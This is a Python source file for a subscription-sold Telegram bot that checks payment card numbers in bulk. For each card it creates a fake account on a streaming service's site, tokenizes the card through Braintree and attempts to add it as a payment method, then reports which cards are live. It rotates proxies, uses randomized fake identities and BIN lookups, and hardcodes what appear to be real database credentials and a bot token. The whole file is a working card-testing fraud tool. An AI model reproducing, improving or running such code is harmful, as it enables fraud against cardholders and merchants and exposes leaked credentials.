import asyncio
import logging
import os
from datetime import datetime, timedelta
import random
import string
import time
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import motor.motor_asyncio
from bs4 import BeautifulSoup
import re
import base64
import user_agent

# ====================== LOGGING ======================
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ====================== DATABASE ======================
client = motor.motor_asyncio.AsyncIOMotorClient(os.getenv('MONGODB_URI', 'mongodb+srv://ElectraOp:BGMI272@cluster0.1jmwb.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0'))
db = client['fn_mass_checker']
users_collection = db['users']
keys_collection = db['keys']

# ====================== CONFIG ======================
TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8009942983:AAEnjw_VFpvyb_0bjlb-93Yj3qRBxkGmISI')
OWNER_ID = 7593550190

# Proxy
PROXY = True
try:
    with open('proxies.txt', 'r') as f:
        PROXY_LIST = [line.strip() for line in f.readlines() if line.strip()]
except FileNotFoundError:
    PROXY_LIST = []
    if PROXY:
        logger.warning("proxies.txt not found → Running without proxies")

user = user_agent.generate_user_agent()

TIERS = {'Gold': 500, 'Platinum': 1000, 'Owner': 3000}

# Queue & Control
check_queue = asyncio.Queue()
active_tasks = {}
stop_checking = {}

# ====================== DB HELPER ======================
async def get_user(user_id):
    return await users_collection.find_one({'user_id': user_id})

async def update_user(user_id, data):
    await users_collection.update_one({'user_id': user_id}, {'$set': data}, upsert=True)

async def delete_user_subscription(user_id):
    await users_collection.update_one({'user_id': user_id}, {'$unset': {'tier': "", 'expiration': "", 'cc_limit': "", 'checked': ""}})

async def generate_key(tier, duration_days):
    key = f"FN-B3-{''.join(random.choices(string.ascii_uppercase + string.digits, k=6))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=6))}"
    await keys_collection.insert_one({'key': key, 'tier': tier, 'duration_days': duration_days, 'redeemed': False})
    return key

async def redeem_key(user_id, key):
    key_data = await keys_collection.find_one({'key': key, 'redeemed': False})
    if key_data:
        tier = key_data['tier']
        duration_days = key_data['duration_days']
        expiration = datetime.now() + timedelta(days=duration_days)
        await update_user(user_id, {'tier': tier, 'expiration': expiration, 'cc_limit': TIERS[tier], 'checked': 0})
        await keys_collection.update_one({'key': key}, {'$set': {'redeemed': True}})
        return tier, duration_days
    return None

# ====================== GENERATORS ======================
def generate_full_name():
    first = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah"]
    last = ["Khalil", "Abdullah", "Smith", "Johnson", "Williams"]
    return random.choice(first), random.choice(last)

def generate_address():
    cities = ["London", "Manchester"]
    streets = ["Baker St", "Oxford St"]
    zips = ["SW1A 1AA", "M1 1AE"]
    city = random.choice(cities)
    return city, "England", f"{random.randint(1, 999)} {random.choice(streets)}", random.choice(zips)

def generate_email():
    return ''.join(random.choices(string.ascii_lowercase, k=10)) + "@gmail.com"

def generate_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=15))

def generate_phone():
    return "303" + ''.join(random.choices(string.digits, k=7))

def generate_code(length=36):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# ====================== BIN INFO ======================
async def get_bin_details(bin_number):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=10) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return (
                        data.get('bank', 'Unknown'),
                        data.get('brand', 'Unknown').capitalize(),
                        data.get('level', 'Unknown'),
                        data.get('type', 'Unknown'),
                        data.get('country_name', 'Unknown'),
                        data.get('country_flag', '')
                    )
    except:
        pass
    return "Unknown", "Unknown", "Unknown", "Unknown", "Unknown", ""

# ====================== PROXY TEST ======================
async def test_proxy(proxy_url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://www.google.com", proxy=proxy_url, timeout=6, ssl=False) as r:
                return r.status == 200
    except:
        return False

# ====================== CARD CHECKER ======================
async def check_cc(cc_details):
    cc, mes, ano, cvv = cc_details.split('|')
    if len(mes) == 1: mes = f'0{mes}'
    if not ano.startswith('20'): ano = f'20{ano}'
    full = f"{cc}|{mes}|{ano}|{cvv}"

    bin_number = cc[:6]
    issuer, card_type, card_level, card_type_category, country_name, country_flag = await get_bin_details(bin_number)

    start_time = time.time()
    first_name, last_name = generate_full_name()
    city, state, street_address, zip_code = generate_address()
    acc = generate_email()
    username = generate_username()
    num = generate_phone()

    proxy_url = None
    proxy_status = "None"
    is_live = False
    if PROXY and PROXY_LIST:
        proxy_url = random.choice(PROXY_LIST)
        is_live = await test_proxy(proxy_url)
        proxy_status = "Live" if is_live else "Dead"
    proxy_arg = proxy_url if is_live else None

    headers = {'user-agent': user}

    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=90)) as session:
            # Register
            async with session.get('https://www.plex.tv/sign-up/', headers=headers, proxy=proxy_arg, ssl=False) as r:
                text = await r.text()
                reg = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', text).group(1)

            data = {
                'email': acc, 'password': '@ElectraOp@272',
                'woocommerce-register-nonce': reg, '_wp_http_referer': '/sign-up/', 'register': 'Register'
            }
            async with session.post('https://www.plex.tv/wp-login.php?action=register', headers=headers, data=data, proxy=proxy_arg, ssl=False):
                pass

            # Payment page
            async with session.get('https://account.plex.tv/payments/add', headers=headers, proxy=proxy_arg, ssl=False) as r:
                text = await r.text()
                add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', text).group(1)
                client_nonce = re.search(r'client_token_nonce":"([^"]+)"', text).group(1)

            # Client token
            data = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_nonce}
            async with session.post('https://account.plex.tv/wp-admin/admin-ajax.php', headers=headers, data=data, proxy=proxy_arg, ssl=False) as r:
                token_resp = await r.json()
                enc = token_resp['data']
                dec = base64.b64decode(enc).decode('utf-8')
                au = re.search(r'"authorizationFingerprint":"(.*?)"', dec).group(1)

            # Tokenize
            tokenize_headers = {
                'authorization': f'Bearer {au}', 'braintree-version': '2018-05-10',
                'content-type': 'application/json', 'origin': 'https://assets.braintreegateway.com',
                'referer': 'https://assets.braintreegateway.com/', 'user-agent': user
            }
            json_data = {
                'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': generate_code()},
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
                'variables': {'input': {'creditCard': {'number': cc, 'expirationMonth': mes, 'expirationYear': ano, 'cvv': cvv}, 'options': {'validate': False}}},
                'operationName': 'TokenizeCreditCard'
            }
            async with session.post('https://payments.braintree-api.com/graphql', headers=tokenize_headers, json=json_data, proxy=proxy_arg, ssl=False) as r:
                tok = (await r.json())['data']['tokenizeCreditCard']['token']

            # Add payment method
            headers.update({
                'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://account.plex.tv/',
                'referer': 'https://account.plex.tv/en-GB/payments/add/'
            })
            data = [
                ('payment_method', 'braintree_credit_card'), ('wc-braintree-credit-card-card-type', 'master-card'),
                ('wc_braintree_credit_card_payment_nonce', tok), ('wc_braintree_device_data', '{"correlation_id":"ca769b8abef6d39b5073a87024953791"}'),
                ('wc-braintree-credit-card-tokenize-payment-method', 'true'), ('woocommerce-add-payment-method-nonce', add_nonce),
                ('_wp_http_referer', '/en-GB/payments/add/'), ('woocommerce_add_payment_method', '1'),
                ('billing_country', 'US'), ('postal_code', '10002')
            ]
            async with session.post('https://account.plex.tv/en-GB/payments/add/', headers=headers, data=data, proxy=proxy_arg, ssl=False) as resp:
                text = await resp.text()
                soup = BeautifulSoup(text, 'html.parser')
                error_msg = soup.select_one('.woocommerce-error .message-container')
                msg = error_msg.text.strip() if error_msg else "Unknown"

        time_taken = time.time() - start_time
        result = {
            'card': full, 'message': msg, 'time_taken': time_taken, 'proxy_status': proxy_status,
            'issuer': issuer, 'card_type': card_type, 'card_level': card_level, 'card_type_category': card_type_category,
            'country_name': country_name, 'country_flag': country_flag
        }

        if any(x in text for x in ['Nice! New payment method added', 'Insufficient funds', 'Payment method successfully added.', 'Duplicate card exists in the vault.']):
            result['status'] = 'approved'
        elif 'Card Issuer Declined CVV' in text:
            result['status'] = 'ccn'
        else:
            result['status'] = 'declined'

        return result

    except Exception as e:
        return {
            'card': full, 'status': 'error', 'message': str(e), 'time_taken': time.time() - start_time,
            'proxy_status': proxy_status, 'issuer': issuer or "Unknown", 'card_type': card_type,
            'card_level': card_level, 'card_type_category': card_type_category,
            'country_name': 'Unknown', 'country_flag': ''
        }

# ====================== BACKGROUND WORKER ======================
async def process_checks():
    while True:
        for cc, task in list(active_tasks.items()):
            if task.done():
                active_tasks.pop(cc, None)

        if len(active_tasks) < 3 and not check_queue.empty():
            user_id, cc_details, update, context = await check_queue.get()
            task = asyncio.create_task(single_check(user_id, cc_details, update, context))
            active_tasks[cc_details] = task

        await asyncio.sleep(0.5)

async def single_check(user_id, cc_details, update, context):
    try:
        checking_msg = await update.message.reply_text("Checking Your Card Please Wait...")
        result = await check_cc(cc_details)
        await checking_msg.delete()

        card_info = f"{result['card_type']} - {result['card_level']} - {result['card_type_category']}"
        country_display = f"{result['country_name']} {result['country_flag']}" if result['country_flag'] else result['country_name']
        checked_by = f"<a href='tg://user?id={user_id}'>{user_id}</a>"
        user = await get_user(user_id)
        tier = user['tier'] if user else "Free"

        if result['status'] == 'approved':
            text = (f"Approved\n\n"
                    f"[Card] <code>{result['card']}</code>\n"
                    f"[Gateway] Braintree Auth\n"
                    f"[Response] Approved\n\n"
                    f"[Info] {card_info}\n"
                    f"[Issuer] {result['issuer']}\n"
                    f"[Country] {country_display}\n\n"
                    f"[Time] {result['time_taken']:.2f}s\n"
                    f"[Proxy] {result['proxy_status']}\n"
                    f"[Checked By] {checked_by} [{tier}]\n"
                    f"[Bot] <a href='tg://user?id=8009942983'>FN B3 AUTH</a>")
        else:
            text = (f"Declined\n\n"
                    f"[Card] <code>{result['card']}</code>\n"
                    f"[Gateway] Braintree Auth\n"
                    f"[Response] {result['message']}\n\n"
                    f"[Info] {card_info}\n"
                    f"[Issuer] {result['issuer']}\n"
                    f"[Country] {country_display}\n\n"
                    f"[Time] {result['time_taken']:.2f}s\n"
                    f"[Proxy] {result['proxy_status']}\n"
                    f"[Checked By] {checked_by} [{tier}]\n"
                    f"[Bot] <a href='tg://user?id=8009942983'>FN B3 AUTH</a>")
            if 'Card Issuer Declined CVV' in result['message']:
                text = text.replace("Declined", "CCN Live")

        await update.message.reply_text(text, parse_mode='HTML', disable_web_page_preview=True)

        if user:
            await update_user(user_id, {'checked': user.get('checked', 0) + 1})

    finally:
        active_tasks.pop(cc_details, None)

# ====================== HANDLERS ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("Upload Files", callback_data='upload_files')]]
    await update.message.reply_text(
        "Welcome To FN B3 AUTH Checker!\n\n"
        "/chk cc|mm|yy|cvv → Single check\n"
        "Send .txt file → Mass check\n"
        "/redeem <key> → Activate subscription",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = await get_user(user_id)
    if not user or user.get('expiration', datetime.now()) < datetime.now():
        await update.message.reply_text("No active subscription!\nUse /redeem <key>")
        return

    if not context.args:
        await update.message.reply_text("Usage: /chk 4242424242424242|12|27|123")
        return

    cc_details = ' '.join(context.args)
    if len(cc_details.split('|')) != 4:
        await update.message.reply_text("Invalid format!")
        return

    await check_queue.put((user_id, cc_details, update, context))

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = await get_user(user_id)
    if not user or user.get('expiration', datetime.now()) < datetime.now():
        await update.message.reply_text("No active subscription!")
        return

    file = await update.message.document.get_file()
    content = await file.download_as_bytearray()
    lines = [line.decode().strip() for line in content.splitlines() if '|' in line and len(line.split('|')) == 4]

    if not lines:
        await update.message.reply_text("No valid cards found!")
        return

    if len(lines) > user['cc_limit']:
        await update.message.reply_text(f"Limit: {user['cc_limit']} cards per check!")
        return

    stop_checking[user_id] = False
    msg = await update.message.reply_text("Starting mass check...")
    # You can expand this with progress updates if you want
    for cc in lines:
        if stop_checking.get(user_id):
            await msg.edit_text("Stopped by user")
            break
        await check_queue.put((user_id, cc, update, context))
    await msg.edit_text("All cards added to queue!")

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    try:
        tier, duration, qty = context.args
        duration = int(duration.replace('d', ''))
        qty = int(qty)
        keys = [await generate_key(tier, duration) for _ in range(qty)]
        await update.message.reply_text("Generated:\n" + "\n".join(keys))
    except:
        await update.message.reply_text("Usage: /genkey Gold 7d 10")

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /redeem KEY")
        return
    key = context.args[0]
    result = await redeem_key(update.effective_user.id, key)
    if result:
        tier, days = result
        await update.message.reply_text(f"Redeemed!\nTier: {tier}\nValid: {days} days")
    else:
        await update.message.reply_text("Invalid or used key!")

async def delkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    try:
        uid = int(context.args[0])
        await delete_user_subscription(uid)
        await update.message.reply_text("Subscription removed")
    except:
        await update.message.reply_text("Usage: /delkey user_id")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    message = ' '.join(context.args)
    users = await users_collection.find().to_list(None)
    for user in users:
        try:
            await context.bot.send_message(user['user_id'], message)
        except:
            pass
    await update.message.reply_text("Broadcast sent")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == 'upload_files':
        await query.message.reply_text("Send your .txt combo file")

# ====================== POST INIT ======================
async def post_init(application: Application):
    application.create_task(process_checks())
    print("FN B3 AUTH → Background checker started!")

# ====================== MAIN ======================
async def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("chk", chk))
    app.add_handler(CommandHandler("genkey", genkey))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("delkey", delkey))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(CallbackQueryHandler(button_callback))

    app.post_init = post_init

    print("FN B3 AUTH Bot Starting...")
    await app.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    asyncio.run(main())
